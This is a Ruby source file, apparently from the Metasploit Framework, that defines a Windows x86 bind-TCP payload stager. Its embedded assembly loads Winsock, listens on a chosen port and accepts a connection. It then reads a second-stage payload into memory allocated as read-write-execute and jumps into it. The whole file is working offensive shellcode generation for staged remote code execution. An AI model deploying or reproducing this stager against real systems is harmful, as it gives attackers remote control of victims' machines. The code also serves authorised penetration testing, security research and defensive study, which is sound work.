# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/payload/transport_config'
require 'msf/core/payload/windows/send_uuid'
require 'msf/core/payload/windows/block_api'
require 'msf/core/payload/windows/exitfunk'

module Msf


###
#
# Complex bindtcp payload generation for Windows ARCH_X86
#
###


module Payload::Windows::BindTcp

  include Msf::Payload::TransportConfig
  include Msf::Payload::Windows
  include Msf::Payload::Windows::SendUUID
  include Msf::Payload::Windows::BlockApi
  include Msf::Payload::Windows::Exitfunk

  #
  # Generate the first stage
  #
  def generate
    conf = {
      port:     datastore['LPORT'],
      reliable: false
    }

    # Generate the more advanced stager if we have the space
    if self.available_space && required_space <= self.available_space
      conf[:exitfunk] = datastore['EXITFUNC']
      conf[:reliable] = true
    end

    generate_bind_tcp(conf)
  end

  #
  # By default, we don't want to send the UUID, but we'll send
  # for certain payloads if requested.
  #
  def include_send_uuid
    false
  end

  def transport_config(opts={})
    transport_config_bind_tcp(opts)
  end

  #
  # Don't use IPv6 by default, this can be overridden by other payloads
  #
  def use_ipv6
    false
  end

  #
  # Generate and compile the stager
  #
  def generate_bind_tcp(opts={})
    combined_asm = %Q^
      cld                    ; Clear the direction flag.
      call start             ; Call start, this pushes the address of 'api_call' onto the stack.
      #{asm_block_api}
      start:
        pop ebp
      #{asm_bind_tcp(opts)}
      #{asm_block_recv(opts)}
    ^
    Metasm::Shellcode.assemble(Metasm::X86.new, combined_asm).encode_string
  end

  #
  # Determine the maximum amount of space required for the features requested
  #
  def required_space
    # Start with our cached default generated size
    space = cached_size

    # EXITFUNK processing adds 31 bytes at most (for ExitThread, only ~16 for others)
    space += 31

    # EXITFUNK unset will still call ExitProces, which adds 7 bytes (accounted for above)

    # Reliability checks add 4 bytes for the first check, 5 per recv check (2)
    space += 14

    space += uuid_required_size if include_send_uuid

    # The final estimated size
    space
  end

  #
  # Generate an assembly stub with the configured feature set and options.
  #
  # @option opts [Integer] :port The port to connect to
  # @option opts [String] :exitfunk The exit method to use if there is an error, one of process, thread, or seh
  # @option opts [Bool] :reliable Whether or not to enable error handling code
  #
  def asm_bind_tcp(opts={})

    reliable      = opts[:reliable]
    addr_fam      = 2
    sockaddr_size = 16

    if use_ipv6
      addr_fam = 23
      sockaddr_size = 28
    end

    encoded_port   = "0x%.8x" % [opts[:port].to_i, addr_fam].pack("vn").unpack("N").first

    asm = %Q^
      ; Input: EBP must be the address of 'api_call'.
      ; Output: EDI will be the newly connected clients socket
      ; Clobbers: EAX, ESI, EDI, ESP will also be modified (-0x1A0)

      bind_tcp:
        push 0x00003233        ; Push the bytes 'ws2_32',0,0 onto the stack.
        push 0x5F327377        ; ...
        push esp               ; Push a pointer to the "ws2_32" string on the stack.
        push #{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')}
        call ebp               ; LoadLibraryA( "ws2_32" )

        mov eax, 0x0190        ; EAX = sizeof( struct WSAData )
        sub esp, eax           ; alloc some space for the WSAData structure
        push esp               ; push a pointer to this stuct
        push eax               ; push the wVersionRequested parameter
        push #{Rex::Text.block_api_hash('ws2_32.dll', 'WSAStartup')}
        call ebp               ; WSAStartup( 0x0190, &WSAData );

        push 11
        pop ecx
      push_0_loop:
        push eax               ; if we succeed, eax will be zero, push it enough times
                               ; to cater for both IPv4 and IPv6
        loop push_0_loop

                               ; push zero for the flags param [8]
                               ; push null for reserved parameter [7]
                               ; we do not specify a WSAPROTOCOL_INFO structure [6]
                               ; we do not specify a protocol [5]
        push 1                 ; push SOCK_STREAM
        push #{addr_fam}       ; push AF_INET/6
        push #{Rex::Text.block_api_hash('ws2_32.dll', 'WSASocketA')}
        call ebp               ; WSASocketA( AF_INET/6, SOCK_STREAM, 0, 0, 0, 0 );
        xchg edi, eax          ; save the socket for later, don't care about the value of eax after this

                               ; bind to 0.0.0.0/[::], pushed earlier

        push #{encoded_port}   ; family AF_INET and port number
        mov esi, esp           ; save a pointer to sockaddr_in struct
        push #{sockaddr_size}  ; length of the sockaddr_in struct (we only set the first 8 bytes, the rest aren't used)
        push esi               ; pointer to the sockaddr_in struct
        push edi               ; socket
        push #{Rex::Text.block_api_hash('ws2_32.dll', 'bind')}
        call ebp               ; bind( s, &sockaddr_in, 16 );
    ^

    # Check for a failed bind() call
    if reliable
      asm << %Q^
        test eax,eax
        jnz failure
      ^
    end

    asm << %Q^
                               ; backlog, pushed earlier [3]
        push edi               ; socket
        push #{Rex::Text.block_api_hash('ws2_32.dll', 'listen')}
        call ebp               ; listen( s, 0 );

                               ; we set length for the sockaddr struct to zero, pushed earlier [2]
                               ; we dont set the optional sockaddr param, pushed earlier [1]
        push edi               ; listening socket
        push #{Rex::Text.block_api_hash('ws2_32.dll', 'accept')}
        call ebp               ; accept( s, 0, 0 );

        push edi               ; push the listening socket
        xchg edi, eax          ; replace the listening socket with the new connected socket for further comms
        push #{Rex::Text.block_api_hash('ws2_32.dll', 'closesocket')}
        call ebp               ; closesocket( s );
    ^

    asm << asm_send_uuid if include_send_uuid

    asm
  end

  #
  # Generate an assembly stub with the configured feature set and options.
  #
  # @option opts [Bool] :reliable Whether or not to enable error handling code
  #
  def asm_block_recv(opts={})
    reliable     = opts[:reliable]
    asm = %Q^
      recv:
        ; Receive the size of the incoming second stage...
        push 0                 ; flags
        push 4                 ; length = sizeof( DWORD );
        push esi               ; the 4 byte buffer on the stack to hold the second stage length
        push edi               ; the saved socket
        push #{Rex::Text.block_api_hash('ws2_32.dll', 'recv')}
        call ebp               ; recv( s, &dwLength, 4, 0 );
    ^

    # Check for a failed recv() call
    if reliable
      asm << %Q^
        cmp eax, 0
        jle failure
      ^
    end

    asm << %Q^
        ; Alloc a RWX buffer for the second stage
        mov esi, [esi]         ; dereference the pointer to the second stage length
        push 0x40              ; PAGE_EXECUTE_READWRITE
        push 0x1000            ; MEM_COMMIT
        push esi               ; push the newly recieved second stage length.
        push 0                 ; NULL as we dont care where the allocation is.
        push #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
        call ebp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
        ; Receive the second stage and execute it...
        xchg ebx, eax          ; ebx = our new memory address for the new stage
        push ebx               ; push the address of the new stage so we can return into it
      read_more:               ;
        push 0                 ; flags
        push esi               ; length
        push ebx               ; the current address into our second stage's RWX buffer
        push edi               ; the saved socket
        push #{Rex::Text.block_api_hash('ws2_32.dll', 'recv')}
        call ebp               ; recv( s, buffer, length, 0 );
    ^

    # Check for a failed recv() call
    if reliable
      asm << %Q^
        cmp eax, 0
        jle failure
      ^
    end

    asm << %Q^
        add ebx, eax           ; buffer += bytes_received
        sub esi, eax           ; length -= bytes_received, will set flags
        jnz read_more          ; continue if we have more to read
        ret                    ; return into the second stage
    ^

    if reliable
      if opts[:exitfunk]
        asm << %Q^
      failure:
        ^
        asm << asm_exitfunk(opts)
      else
        asm << %Q^
      failure:
        push #{Rex::Text.block_api_hash('kernel32.dll', 'ExitProcess')}
        call ebp
        ^
      end
    end

    asm
  end

end

end

